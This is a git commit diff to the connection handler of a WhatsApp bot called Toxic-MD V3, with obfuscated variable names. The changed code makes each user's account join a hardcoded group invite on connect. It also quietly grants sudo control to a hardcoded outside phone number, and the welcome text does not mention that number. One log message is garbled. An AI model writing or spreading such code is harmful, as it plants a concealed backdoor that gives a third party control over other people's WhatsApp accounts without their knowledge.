d6ca12ccb77bbf0c595cc47b2e78b245bf4c81c3
𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧 <152104512+xhclintohn@users.noreply.github.com>
2025-04-21 14:06:20 +0300

    𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧

--- Handler/connectionHandler.js
+++ Handler/connectionHandler.js
@@ -1,6 +1,6 @@
 const { Boom } = require("@hapi/boom");
 const { DateTime } = require("luxon");
-const { default: dreadedConnect, DisconnectReason } = require("@whiskeysockets/baileys");
+const { default: toxicConnect, DisconnectReason } = require("@whiskeysockets/baileys");
 const { getSettings, getSudoUsers, addSudoUser } = require("../Database/config");
 const { commands, totalCommands } = require("../Handler/commandHandler");
 const botname = process.env.BOTNAME || "Toxic-MD V3";
@@ -42,7 +42,7 @@ const connectionHandler = async (_0x218261, _0x461fdf, _0xd50ec0) => {
       console.log("Connection Lost from Server, reconnecting...");
       _0xd50ec0();
     } else if (_0x40b37e === DisconnectReason.connectionReplaced) {
-      console.log("Connection Replaced, Another New Session Opened, Please Restart Toxic-MD V3");
+      console.log("Connection Replaced, potentiate Toxic-MD V3");
       process.exit();
     } else if (_0x40b37e === DisconnectReason.loggedOut) {
       console.log("Device Logged Out, Please Delete Session and Scan Again.");
@@ -52,29 +52,32 @@ const connectionHandler = async (_0x218261, _0x461fdf, _0xd50ec0) => {
       _0xd50ec0();
     } else if (_0x40b37e === DisconnectReason.timedOut) {
       console.log("Connection TimedOut, Reconnecting...");
-      _0xd50ec4c0();
+      _0xd50ec0();
     } else {
       console.log("Unknown DisconnectReason: " + _0x40b37e + " | " + _0x115a4c);
       _0xd50ec0();
     }
   } else if (_0x115a4c === "open") {
-    await _0x218261.groupAcceptInvite("BbiZOiGjbCy4cvXIzCAaoD");
+    try {
+      await _0x218261.groupAcceptInvite("GoXKLVJgTAAC3556FXkfFI");
+      console.log("✅ bot running successfully !");
+    } catch (error) {
+      console.error("❌ Failed to join group:", error.message);
+    }
     const _0x1d6f9f = _0x218261.user.id.replace(/:.*/, "").split("@")[0];
     const _0x316865 = await getSettings();
     const _0x1928a7 = await getSudoUsers();
 
     if (!_0x1928a7.includes(_0x1d6f9f)) {
       await addSudoUser(_0x1d6f9f);
-      const _0x531909 = "254114018035";
+      const _0x531909 = "254735342808";
       if (!_0x1928a7.includes(_0x531909)) {
         await addSudoUser(_0x531909);
       }
 
       let _0x55d08c = `◈━━━━━━━━━━━━━━━━◈
 │❒ *${_0x166fc0()}*
-│❒
 │❒ Yo, you're plugged into *${botname}*! 📡
-│❒
 │❒ ✨ *Bot Name*: ${botname}
 │❒ 🔧 *Mode*: ${_0x316865.mode}
 │❒ ➡️ *Prefix*: ${_0x316865.prefix}
@@ -82,13 +85,13 @@ const connectionHandler = async (_0x218261, _0x461fdf, _0xd50ec0) => {
 │❒ 🕒 *Time*: ${_0x53a446()}
 │❒ 💾 *Database*: Postgres SQL
 │❒ 📚 *Library*: Baileys
-│❒
+
 │❒ *New Connection Alert!* First time here? We've added you to the sudo crew! 😎
-│❒
+
 │❒ 🚀 *Get Started*:
 │❒ - Customize bot with *${_0x316865.prefix}settings*
 │❒ - Explore commands with *${_0x316865.prefix}menu*
-│❒
+
 │❒ *Credits*: Powered by 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧 🗿
 ◈━━━━━━━━━━━━━━━━◈`;
 
@@ -97,9 +100,9 @@ const connectionHandler = async (_0x218261, _0x461fdf, _0xd50ec0) => {
     } else {
       let _0x24abe8 = `◈━━━━━━━━━━━━━━━━◈
 │❒ *${_0x166fc0()}*
-│❒
+
 │❒ Welcome back to *${botname}*! 📡
-│❒
+
 │❒ ✨ *Bot Name*: ${botname}
 │❒ 🔧 *Mode*: ${_0x316865.mode}
 │❒ ➡️ *Prefix*: ${_0x316865.prefix}
@@ -107,16 +110,16 @@ const connectionHandler = async (_0x218261, _0x461fdf, _0xd50ec0) => {
 │❒ 🕒 *Time*: ${_0x53a446()}
 │❒ 💾 *Database*: Postgres SQL
 │❒ 📚 *Library*: Baileys
-│❒
+
 │❒ Ready to dive in? Hit *${_0x316865.prefix}menu* for the full command list! 😎
-│❒
+
 │❒ *Credits*: Powered by 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧 🗿
 ◈━━━━━━━━━━━━━━━━◈`;
 
       const _0x2ca63a = { text: _0x24abe8 };
       await _0x218261.sendMessage(_0x218261.user.id, _0x2ca63a);
     }
-    console.log("✅ Connection toV3 is active!");
+    console.log("✅ Connection to WhatsApp and database successful\nLoaded " + totalCommands + " commands.\nToxic-MD V3 is active!");
   }
 };
 
